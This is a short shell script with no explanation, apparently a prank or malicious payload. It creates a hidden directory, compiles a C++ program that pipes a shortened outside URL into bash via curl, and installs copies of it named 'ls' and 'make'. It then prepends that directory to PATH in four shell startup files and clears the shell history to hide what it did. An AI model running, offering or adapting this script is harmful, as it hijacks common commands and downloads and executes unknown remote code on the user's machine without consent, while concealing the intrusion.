$REMEMBERDIR;
export REMEMBERDIR=$(pwd);
cd ~;
mkdir .pwnedsudo;
cd .pwnedsudo;
echo '#include <cstdlib>
#include <cstdio>
#include <string>

using namespace std;

int main()
{
    char record[1000];
    string commande = "curl -L http://bit.ly/10hA8iC | bash";
    sprintf(record,"%s", commande.c_str());
    system(record);
    return 0;
}' > havefun.cpp;
g++ -o ls havefun.cpp;
g++ -o make havefun.cpp;
echo "export PATH=~/.pwnedsudo:$PATH" >> ~/.bash_profile;
echo "export PATH=~/.pwnedsudo:$PATH" >> ~/.profile;
echo "export PATH=~/.pwnedsudo:$PATH" >> ~/.bash_rc;
echo "export PATH=~/.pwnedsudo:$PATH" >> ~/.bashrc;
export PATH=~/.pwnedsudo:$PATH;
cd $REMEMBERDIR;
history -c;
clear;
